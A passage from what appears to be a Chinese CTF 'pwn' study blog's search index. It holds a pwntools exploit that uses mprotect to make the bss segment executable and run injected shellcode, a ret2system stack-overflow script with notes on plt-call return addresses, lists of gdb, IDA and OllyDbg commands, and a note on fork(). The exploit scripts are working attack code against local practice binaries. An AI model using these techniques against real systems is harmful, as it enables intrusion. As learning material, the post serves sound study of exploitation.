class="hljs-number">0x080489a0</span><br>shell=<span class="hljs-number">0x080ECA2d</span><br>pop_esi_edi_ebp_ret=<span class="hljs-number">0x080483b8</span><br>printf_addr=<span class="hljs-number">0x0804F0A0</span><br>exit_addr=<span class="hljs-number">0x0804E660</span><br>shellcode=asm(shellcraft.sh())<br>read_addr=elf.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br>mprotect_addr=<span class="hljs-number">0x0806ED40</span><br><span class="hljs-comment">#gdb.attach(a)</span><br><span class="hljs-comment">#pause()</span><br><span class="hljs-comment">#payload=b&quot;a&quot;*(0x2d)+p32(flag)+p32(printf_addr)+p32(exit_addr)+p32(shell)</span><br>payload=<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x2d</span>+p32(mprotect_addr)+p32(pop_esi_edi_ebp_ret)+p32(<span class="hljs-number">0x80eb000</span>)+p32(<span class="hljs-number">0x100</span>)+p32(<span class="hljs-number">0x7</span>)<br>payload+=p32(read_addr)+p32(pop_esi_edi_ebp_ret)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0x80eb000</span>)+p32(<span class="hljs-built_in">len</span>(shellcode))+p32(<span class="hljs-number">0x80eb000</span>)<br>a.sendline(payload)<br>a.sendline(shellcode)<br><span class="hljs-comment">#0x080483b8 : pop esi ; pop edi ; pop ebp ; ret</span><br>a.interactive()<br></code></pre></td></tr></table></figure><p>通过mprotect函数改变bss段权限之后，往bss段写入shellcode，使shellcode可以执行</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>stack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于布置栈的见解</title>
    <link href="/2024/10/15/%E5%85%B3%E4%BA%8E%E5%B8%83%E7%BD%AE%E6%A0%88%E7%9A%84%E8%A7%81%E8%A7%A3/"/>
    <url>/2024/10/15/%E5%85%B3%E4%BA%8E%E5%B8%83%E7%BD%AE%E6%A0%88%E7%9A%84%E8%A7%81%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><br>p=process(<span class="hljs-string">&#x27;./test2&#x27;</span>)<br><br>system_addr=<span class="hljs-number">0x0804845C</span><br>bin_sh_addr=<span class="hljs-number">0x0804A024</span><br>system_plt_addr=<span class="hljs-number">0x08048320</span><br>payload=(<span class="hljs-number">0x88</span>+<span class="hljs-number">0x4</span>)*<span class="hljs-string">b&#x27;a&#x27;</span>+p32(system_addr)+p32(bin_sh_addr)<br><span class="hljs-comment">#payload1=(0x88+0x4)*&#x27;a&#x27;+p32(system_plt_addr)+&#x27;bbbb&#x27;+p32(bin_sh_addr)</span><br><span class="hljs-comment">#error_payload=(0x88+0x4)*&#x27;a&#x27;+p32(system_addr)+&#x27;bbbb&#x27;+p32(bin_sh_addr)</span><br>gdb.attach(p)<br><span class="hljs-comment">#print payload</span><br><span class="hljs-comment">#print payload1</span><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>调用函数plt地址，需要有返回地址一般加“bbbb”这类无效地址，后面加参数。</p><p>调用程序代码段的函数直接跟参数就行。</p><p>汇编语言中的call指令相当于：push call指令的下一条指令，jmp call指令单步步入的地址。</p><p>总而言之如果调用的是代码段里的函数后面直接跟该函数参数就可以，如果是调用的plt段的函数需要提供一个虚假返回地址后面再跟该函数的参数，上文的error_payload是将两者杂糅了，调用了代码段的函数并且提供了虚假的返回地址，导致system函数的参数是’bbbb’，而不是binsh_addr.</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>stack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基本调试方法</title>
    <link href="/2024/10/15/%E8%B0%83%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    <url>/2024/10/15/%E8%B0%83%E8%AF%95%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="调试基础"><a href="#调试基础" class="headerlink" title="调试基础"></a>调试基础</h2><h4 id="基本命令包括以下几个："><a href="#基本命令包括以下几个：" class="headerlink" title="基本命令包括以下几个："></a>基本命令包括以下几个：</h4><p>- </p><p>  1.输入gdb或者gdb-multiarch program进行本地调试</p><p>- </p><p>  2.如果是本地程序的话，可以输入entry或者start进入第一条指令</p><p>  - </p><pre><code class="hljs">entry-   如果是本地调试有main函数，则可以输入main直接进入main函数  -     main</code></pre><p>- </p><p>  3.如果调试的程序有源代码，则输入n执行的时候是按照源代码一行一行执行的；</p><p>  - </p><pre><code class="hljs">如果没有源代码，则输入ni来按照汇编语言执行一条条指令</code></pre><p>  - </p><pre><code class="hljs">如果指令是调用了函数，则可以通过si进入调用内部</code></pre><p>- </p><p>  4.输入p 函数名可以打印出函数地址，然后使用nearpc 地址即可显示此函数的反汇编代码</p><p>  - </p><pre><code class="hljs">p scanf</code></pre><p>  - </p><pre><code class="hljs">nearpc 0x7ffff7a777f0</code></pre><p>  - </p><pre><code class="hljs">p/x：以16进制显示变量值</code></pre><p>  - </p><pre><code class="hljs">p/d：10进制显示</code></pre><p>  - </p><pre><code class="hljs">p/o：8进制显示</code></pre><p>- </p><p>  5.下断点，如果有符号，可以直接使用b 函数名下断点，如果没有，则需要使用b *address的方式下断点</p><p>  - </p><pre><code class="hljs">b read/b recv</code></pre><p>  - </p><pre><code class="hljs">b *0x40062b</code></pre><p>  - </p><pre><code class="hljs">通过-   bl列出所有断点 -   bc清除断点 -   bd临时禁用断点 -   be启用断点</code></pre><p>- </p><p>  6.下完断点之后需要执行到断点，从头开始运行输入r命令，继续运行输入c</p><p>- </p><p>  7.通过stack命令可以查看栈的数据</p><p>  - </p><pre><code class="hljs">stack 0x20 [0x20为查看的长度]</code></pre><p>- </p><p>  8.输入context可以重新刷新一下之前的调试界面</p><p>- </p><p>  9.可以通过hexdump查看栈的地址的内容</p><p>  - </p><pre><code class="hljs">hexdump 0x7fffffffe3b8</code></pre><p>  - </p><pre><code class="hljs">x/s 0x7fffffffe3b8</code></pre><p>- </p><p>  10.通过nextcall可以直接进行下一次调用</p><p>- </p><p>  11.vmmap可以查看内存布局</p><p>- </p><p>  12.可以使用p $eax查看寄存器的值，也可以使用i r eax查看</p><p>- </p><p>  13.如果使用的调试器为peda：</p><p>  - </p><pre><code class="hljs">pattern create 200</code></pre><p>  - </p><pre><code class="hljs">pattern offset 0xaddr</code></pre><p>- </p><p>  14.如果遇到栈溢出需要查看偏移量：</p><p>  - </p><pre><code class="hljs">cyclic 200生成200字节的长度数据</code></pre><p>  - </p><pre><code class="hljs">cyclic -l 覆盖的前四个字母：cyclic -l jaab,输出即为偏移量</code></pre><h3 id="IDA和OD快捷键"><a href="#IDA和OD快捷键" class="headerlink" title="IDA和OD快捷键"></a>IDA和OD快捷键</h3><h4 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h4><p>- </p><p>  y修改变量为类型加值</p><p>- </p><p>  n单纯修改变量</p><p>- </p><p>  G跳转到指定地址</p><p>- </p><p>  X查看交叉引用</p><p>- </p><p>  shift+F12查找字符串</p><p>- </p><p>  数组和</p><p>- </p><p>  空格切换图形和文本视图</p><p>- </p><p>  shift+e查看data段初始化的全局变量及静态变量</p><h4 id="OD"><a href="#OD" class="headerlink" title="OD"></a>OD</h4><p>- </p><p>  F2下断点</p><p>- </p><p>  F4运行到选中指令</p><p>- </p><p>  F8步过</p><p>- </p><p>  F7单步执行</p><p>- </p><p>  数据窗口跟随</p><p>- </p><p>  智能搜索可以查找的字符串更全</p><p>- </p><p>  od的基址与ida可能不一样</p><p>- </p><p>   在看<a href="http://www.52pojie.cn/thread-200439-1-1.html">Shark恒 破解教程</a> 时，有很多吾友对教程中按键的含义不懂，我发一个常用的快捷键列表，希望对新手有点帮助。 打开一个新的可执行程序 (F3) 重新运行当前调试的程序 (Ctrl+F2) 当前调试的程序 (Alt+F2) 运行选定的程序进行调试 (F9) 暂时停止被调试程序的执行 (F12) 单步进入被调试程序的 Call 中 (F7) 步过被调试程序的 Call (F8) 跟入被调试程序的 Call 中 (Ctrl+F11) 跟踪时跳过被调试程序的 Call (Ctrl+F12) 执行直到返回 (Ctrl+F9) 显示记录窗口 (Alt+L) 显示模块窗口 (Alt+E) 显示内存窗口 (Alt+M) 显示 CPU 窗口 (Alt+C) 显示补丁窗口 (Ctrl+P) 显示呼叫堆栈 (Alt+K) 显示断点窗口 (Alt+B) 打开调试选项窗口 (Alt+O)</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>other</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/09/16/%E5%A4%9A%E8%BF%9B%E7%A8%8B%E4%B8%8B%E7%9A%84%E7%88%86%E7%A0%B4%EF%BC%88fork%EF%BC%89/"/>
    <url>/2024/09/16/%E5%A4%9A%E8%BF%9B%E7%A8%8B%E4%B8%8B%E7%9A%84%E7%88%86%E7%A0%B4%EF%BC%88fork%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="多进程下的爆破（fork）"><a href="#多进程下的爆破（fork）" class="headerlink" title="多进程下的爆破（fork）"></a>多进程下的爆破（fork）</h2><p>pid_t fork(void)</p><p>创建一个新进程，操作系统会复制父进程的地址空间中的内容给子进程。调用fork函数后，子进程与父进程的执行顺序是无法确定的，子进程无法通过fork()来创建子进程</p><p>该函数有三种返回值</p><p>（1）在父进程中，fork返回新创建的子进程的进程id</p><p>（2）在子进程中，fork返回0</p><p>（3）如果出现错误，fork返回一个负值</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
